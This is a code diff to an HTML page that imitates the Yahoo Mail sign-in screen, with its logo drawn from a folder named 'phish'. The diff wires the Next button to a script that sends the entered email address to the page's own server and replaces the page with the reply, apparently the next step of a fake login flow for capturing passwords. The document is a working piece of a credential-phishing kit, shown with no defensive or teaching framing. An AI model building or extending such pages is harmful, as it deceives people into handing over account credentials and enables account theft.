@@ -12,10 +12,10 @@
         <div class="card">
             <img src="../phish/Yahoo.png" alt="">
             <h2>Sign in to Yahoo Mail</h2>
-            <p>Sign in using your Yahoo account</p>
-            <input type="email" placeholder="Username, email address or mobile number" class="mail-box">
+            <p><small>Sign in using your Yahoo account</small></p>
+            <input id="email" type="email" placeholder="Username, email address or mobile number" class="mail-box">
             <hr>
-            <button class="next">Next</button>
+            <button onclick="ola()" id="next" class="next">Next</button>
             <div class="link-line">
                     <input type="checkbox">
                     <a href="#" class="sign">Stay signed in</a>
@@ -24,5 +24,15 @@
             <button class="create">Create an account</button>
         </div>
     </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script>
+        function ola (){
+            const email  = document.getElementById("email").value;
+            $.post("/page/yahoo-pass", {"email": email}).done( function (data){
+                document.write(data);
+            });
+        }
+        
+    </script>
 </body>
 </html>
